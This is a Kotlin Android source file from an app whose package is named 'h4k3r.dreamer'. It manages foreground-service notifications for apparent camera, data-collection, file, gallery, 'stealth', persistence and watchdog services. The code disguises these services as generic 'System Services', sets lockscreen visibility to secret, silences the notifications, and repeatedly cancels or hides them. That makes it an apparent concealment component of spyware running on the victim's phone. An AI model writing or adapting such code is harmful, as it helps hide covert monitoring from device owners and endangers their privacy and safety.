package com.h4k3r.dreamer

import android.app.NotificationManager
import android.app.NotificationChannel
import android.content.Context
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import kotlinx.coroutines.*

class NotificationAutoManager(private val context: Context) {
    companion object {
        private const val TAG = "NotificationAutoManager"

        @Volatile
        private var instance: NotificationAutoManager? = null

        fun getInstance(context: Context): NotificationAutoManager {
            return instance ?: synchronized(this) {
                instance ?: NotificationAutoManager(context.applicationContext).also { instance = it }
            }
        }

        // Unified notification system - ONE notification for all services
        const val UNIFIED_NOTIFICATION_ID = 1000

        // Individual notification IDs (for internal tracking)
        const val PERMISSION_NOTIFICATION_ID = 999
        const val CAMERA_SERVICE_ID = 1001
        const val DATA_SERVICE_ID = 1002
        const val PERMISSION_MONITOR_ID = 1003
        const val ADVANCED_PERSISTENCE_ID = 1004
        const val STEALTH_SERVICE_ID = 1005
        const val WATCHDOG_SERVICE_ID = 1006
        const val FILES_SERVICE_ID = 1007
        const val GALLERY_SERVICE_ID = 1008

        // Unified notification channel
        private const val UNIFIED_CHANNEL = "unified_service_channel"

        // Service-specific notification channels (for individual services if needed)
        private const val CAMERA_SERVICE_CHANNEL = "camera_service_channel"
        private const val DATA_SERVICE_CHANNEL = "data_service_channel"
        private const val PERMISSION_MONITOR_CHANNEL = "permission_monitor_channel"
        private const val ADVANCED_PERSISTENCE_CHANNEL = "advanced_persistence_channel"
        private const val WATCHDOG_SERVICE_CHANNEL = "watchdog_service_channel"
        private const val FILES_SERVICE_CHANNEL = "files_service_channel"
        private const val GALLERY_SERVICE_CHANNEL = "gallery_service_channel"
    }

    private val scope = CoroutineScope(Dispatchers.Main + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())
    private val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

    // Track active services for unified notification
    private val activeServices = mutableSetOf<String>()
    private val serviceStatus = mutableMapOf<String, String>()

    // Track active notifications (legacy system)
    private val activeNotifications = mutableSetOf<Int>()
    private val temporaryNotifications = mutableMapOf<Int, Long>() // ID to expiry time

    init {
        // Create notification channels
        createAllNotificationChannels()
        startAutoClearService()
    }

    /* ── Unified Notification System ────────────────────────── */

    fun addActiveService(serviceName: String, status: String = "Running") {
        synchronized(activeServices) {
            activeServices.add(serviceName)
            serviceStatus[serviceName] = status
        }
        updateUnifiedNotification()
        Log.d(TAG, "Service added to unified notification: $serviceName ($status)")
    }

    fun removeActiveService(serviceName: String) {
        synchronized(activeServices) {
            activeServices.remove(serviceName)
            serviceStatus.remove(serviceName)
        }
        updateUnifiedNotification()
        Log.d(TAG, "Service removed from unified notification: $serviceName")
    }

    fun updateServiceStatus(serviceName: String, status: String) {
        synchronized(activeServices) {
            if (activeServices.contains(serviceName)) {
                serviceStatus[serviceName] = status
                updateUnifiedNotification()
                Log.d(TAG, "Service status updated: $serviceName -> $status")
            }
        }
    }

    private fun updateUnifiedNotification() {
        try {
            if (activeServices.isEmpty()) {
                // No services running, cancel unified notification
                notificationManager.cancel(UNIFIED_NOTIFICATION_ID)
                return
            }

            val notification = createUnifiedNotification()
            notificationManager.notify(UNIFIED_NOTIFICATION_ID, notification)

        } catch (e: Exception) {
            Log.e(TAG, "Failed to update unified notification: ${e.message}")
        }
    }

    private fun createUnifiedNotification(): android.app.Notification {
        val serviceCount = activeServices.size
        val title = when {
            serviceCount == 1 -> "System Service Active"
            else -> "System Services Active ($serviceCount)"
        }

        val contentText = when {
            activeServices.contains("CameraService") -> "Camera monitoring active"
            activeServices.contains("DataService") -> "Data collection active"
            activeServices.contains("PermissionMonitorService") -> "Permission monitoring active"
            else -> "Background services running"
        }

        // Create expandable notification with service details
        val bigTextStyle = androidx.core.app.NotificationCompat.BigTextStyle()
        val detailText = buildString {
            append("Active Services:\n")
            activeServices.forEachIndexed { index, service ->
                val status = serviceStatus[service] ?: "Running"
                val displayName = when (service) {
                    "CameraService" -> "📷 Camera Monitor"
                    "DataService" -> "📊 Data Collection"
                    "PermissionMonitorService" -> "🔒 Permission Monitor"
                    "AdvancedPersistenceService" -> "⚡ Persistence Manager"
                    "WatchdogService" -> "🐕 Service Watchdog"
                    "FilesService" -> "📁 File Monitor"
                    "GalleryService" -> "🖼️ Gallery Monitor"
                    else -> "🔧 $service"
                }
                append("• $displayName: $status")
                if (index < activeServices.size - 1) append("\n")
            }
        }
        bigTextStyle.bigText(detailText)

        return androidx.core.app.NotificationCompat.Builder(context, UNIFIED_CHANNEL)
            .setContentTitle(title)
            .setContentText(contentText)
            .setSmallIcon(android.R.drawable.ic_menu_info_details)
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_LOW)
            .setVisibility(androidx.core.app.NotificationCompat.VISIBILITY_SECRET)
            .setOngoing(true)
            .setShowWhen(false)
            .setSound(null)
            .setVibrate(null)
            .setStyle(bigTextStyle)
            .setGroup("system_services")
            .setGroupSummary(true)
            .build()
    }

    /* ── Notification Channel Management ────────────────────────── */

    private fun createAllNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            // Create unified channel first
            createUnifiedNotificationChannel()

            // Create individual service channels
            createServiceNotificationChannel("CameraService")
            createServiceNotificationChannel("DataService")
            createServiceNotificationChannel("PermissionMonitorService")
            createServiceNotificationChannel("AdvancedPersistenceService")
            createServiceNotificationChannel("WatchdogService")
            createServiceNotificationChannel("FilesService")
            createServiceNotificationChannel("GalleryService")
        }
    }

    private fun createUnifiedNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val channel = NotificationChannel(
                    UNIFIED_CHANNEL,
                    "System Services",
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    description = "Unified notification for all system services"
                    setSound(null, null)
                    enableVibration(false)
                    setShowBadge(false)
                    lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
                }

                notificationManager.createNotificationChannel(channel)
                Log.d(TAG, "Created unified notification channel")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to create unified notification channel: ${e.message}")
            }
        }
    }

    fun createServiceNotificationChannel(serviceName: String) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val (channelId, channelName, description) = when (serviceName) {
                    "CameraService" -> Triple(CAMERA_SERVICE_CHANNEL, "Camera Service", "Camera monitoring service")
                    "DataService" -> Triple(DATA_SERVICE_CHANNEL, "Data Service", "Data collection service")
                    "PermissionMonitorService" -> Triple(PERMISSION_MONITOR_CHANNEL, "Permission Monitor", "Permission monitoring service")
                    "AdvancedPersistenceService" -> Triple(ADVANCED_PERSISTENCE_CHANNEL, "Persistence Service", "Advanced persistence service")
                    "WatchdogService" -> Triple(WATCHDOG_SERVICE_CHANNEL, "Watchdog Service", "Service monitoring")
                    "FilesService" -> Triple(FILES_SERVICE_CHANNEL, "Files Service", "File management service")
                    "GalleryService" -> Triple(GALLERY_SERVICE_CHANNEL, "Gallery Service", "Gallery monitoring service")
                    else -> Triple("${serviceName.lowercase()}_channel", serviceName, "$serviceName notification channel")
                }

                val channel = NotificationChannel(
                    channelId,
                    channelName,
                    NotificationManager.IMPORTANCE_LOW
                ).apply {
                    this.description = description
                    setSound(null, null)
                    enableVibration(false)
                    setShowBadge(false)
                }

                notificationManager.createNotificationChannel(channel)
                Log.d(TAG, "Created notification channel for $serviceName: $channelId")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to create notification channel for $serviceName: ${e.message}")
            }
        }
    }

    fun getChannelIdForService(serviceName: String): String {
        return when (serviceName) {
            "CameraService" -> CAMERA_SERVICE_CHANNEL
            "DataService" -> DATA_SERVICE_CHANNEL
            "PermissionMonitorService" -> PERMISSION_MONITOR_CHANNEL
            "AdvancedPersistenceService" -> ADVANCED_PERSISTENCE_CHANNEL
            "WatchdogService" -> WATCHDOG_SERVICE_CHANNEL
            "FilesService" -> FILES_SERVICE_CHANNEL
            "GalleryService" -> GALLERY_SERVICE_CHANNEL
            else -> "${serviceName.lowercase()}_channel"
        }
    }

    /* ── Notification Management ────────────────────────── */

    fun registerNotification(notificationId: Int, isPermanent: Boolean = true) {
        synchronized(activeNotifications) {
            activeNotifications.add(notificationId)
            if (!isPermanent) {
                // Auto-clear after 10 seconds for temporary notifications
                temporaryNotifications[notificationId] = System.currentTimeMillis() + 10000
            }
        }
        Log.d(TAG, "Registered notification $notificationId (permanent: $isPermanent)")
    }

    fun unregisterNotification(notificationId: Int) {
        synchronized(activeNotifications) {
            activeNotifications.remove(notificationId)
            temporaryNotifications.remove(notificationId)
        }
        cancelNotification(notificationId)
        Log.d(TAG, "Unregistered notification $notificationId")
    }

    fun clearAllTemporaryNotifications() {
        scope.launch {
            val currentTime = System.currentTimeMillis()
            val toRemove = mutableListOf<Int>()

            synchronized(activeNotifications) {
                temporaryNotifications.forEach { (id, expiryTime) ->
                    if (currentTime > expiryTime) {
                        toRemove.add(id)
                    }
                }

                toRemove.forEach { id ->
                    activeNotifications.remove(id)
                    temporaryNotifications.remove(id)
                    cancelNotification(id)
                }
            }

            if (toRemove.isNotEmpty()) {
                Log.d(TAG, "Auto-cleared ${toRemove.size} expired notifications: $toRemove")
            }
        }
    }

    fun clearPermissionNotifications() {
        val permissionRelatedIds = listOf(
            PERMISSION_NOTIFICATION_ID,
            PERMISSION_NOTIFICATION_ID + 1,
            PERMISSION_NOTIFICATION_ID + 2,
            PERMISSION_NOTIFICATION_ID + 3
        )

        permissionRelatedIds.forEach { id ->
            unregisterNotification(id)
        }

        Log.d(TAG, "Cleared all permission-related notifications")
    }

    fun hideServiceNotificationsTemporarily() {
        scope.launch {
            Log.d(TAG, "Hiding service notifications temporarily")

            val serviceIds = listOf(
                CAMERA_SERVICE_ID,
                DATA_SERVICE_ID,
                PERMISSION_MONITOR_ID,
                STEALTH_SERVICE_ID,
                WATCHDOG_SERVICE_ID
            )

            serviceIds.forEach { id ->
                try {
                    cancelNotification(id)
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to hide notification $id: ${e.message}")
                }
            }

            // Re-show important notifications after delay
            delay(5000)

            // Send intent to services to recreate minimal notifications
            val intent = android.content.Intent("com.h4k3r.dreamer.RECREATE_NOTIFICATIONS")
            context.sendBroadcast(intent)

            Log.d(TAG, "Service notifications will be recreated")
        }
    }

    fun optimizeNotificationDisplay() {
        scope.launch {
            try {
                // Only show one main notification at a time
                val mainNotification = when {
                    activeNotifications.contains(CAMERA_SERVICE_ID) -> CAMERA_SERVICE_ID
                    activeNotifications.contains(DATA_SERVICE_ID) -> DATA_SERVICE_ID
                    activeNotifications.contains(PERMISSION_MONITOR_ID) -> PERMISSION_MONITOR_ID
                    else -> null
                }

                if (mainNotification != null) {
                    // Hide other service notifications temporarily
                    activeNotifications.filter { it != mainNotification && it in listOf(
                        CAMERA_SERVICE_ID, DATA_SERVICE_ID, PERMISSION_MONITOR_ID,
                        STEALTH_SERVICE_ID, WATCHDOG_SERVICE_ID
                    )}.forEach { id ->
                        try {
                            notificationManager.cancel(id)
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to optimize notification $id: ${e.message}")
                        }
                    }

                    Log.d(TAG, "Optimized notifications - showing main: $mainNotification")
                }

            } catch (e: Exception) {
                Log.e(TAG, "Failed to optimize notification display: ${e.message}")
            }
        }
    }

    /* ── Auto-Clear Service ────────────────────────── */

    private fun startAutoClearService() {
        scope.launch {
            while (true) {
                try {
                    // Clear expired temporary notifications every 30 seconds
                    clearAllTemporaryNotifications()

                    // Optimize notification display every 2 minutes
                    if (System.currentTimeMillis() % 120000 < 30000) { // Every 2 minutes
                        optimizeNotificationDisplay()
                    }

                    delay(30000) // 30 second intervals
                } catch (e: Exception) {
                    Log.e(TAG, "Auto-clear service error: ${e.message}")
                    delay(60000) // Wait longer on error
                }
            }
        }
    }

    /* ── Notification Helper Methods ────────────────────────── */

    private fun cancelNotification(notificationId: Int) {
        try {
            notificationManager.cancel(notificationId)
            Log.d(TAG, "Cancelled notification $notificationId")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to cancel notification $notificationId: ${e.message}")
        }
    }

    fun getActiveNotificationCount(): Int {
        return synchronized(activeNotifications) {
            activeNotifications.size
        }
    }

    fun isNotificationActive(notificationId: Int): Boolean {
        return synchronized(activeNotifications) {
            activeNotifications.contains(notificationId)
        }
    }

    /* ── Smart Notification Strategies ────────────────────────── */

    fun implementSmartNotificationStrategy() {
        scope.launch {
            Log.d(TAG, "Implementing smart notification strategy")

            // Strategy 1: Only show critical notifications during active use
            val criticalIds = listOf(CAMERA_SERVICE_ID, DATA_SERVICE_ID)
            val nonCriticalIds = activeNotifications.filter { it !in criticalIds }

            // Hide non-critical notifications
            nonCriticalIds.forEach { id ->
                temporaryNotifications[id] = System.currentTimeMillis() + 60000 // 1 minute
            }

            // Strategy 2: Group similar notifications
            groupSimilarNotifications()

            // Strategy 3: Schedule periodic cleanup
            schedulePeriodicCleanup()
        }
    }

    private fun groupSimilarNotifications() {
        // Group service notifications under one summary
        val serviceIds = listOf(
            CAMERA_SERVICE_ID, DATA_SERVICE_ID, PERMISSION_MONITOR_ID,
            STEALTH_SERVICE_ID, WATCHDOG_SERVICE_ID
        )

        val activeServices = serviceIds.filter { activeNotifications.contains(it) }
        if (activeServices.size > 2) {
            Log.d(TAG, "Grouping ${activeServices.size} service notifications")
            // Keep only the most important one visible
            activeServices.drop(1).forEach { id ->
                cancelNotification(id)
            }
        }
    }

    private fun schedulePeriodicCleanup() {
        handler.postDelayed({
            scope.launch {
                Log.d(TAG, "Performing periodic notification cleanup")
                clearAllTemporaryNotifications()
                optimizeNotificationDisplay()

                // Schedule next cleanup
                schedulePeriodicCleanup()
            }
        }, 180000) // Every 3 minutes
    }
}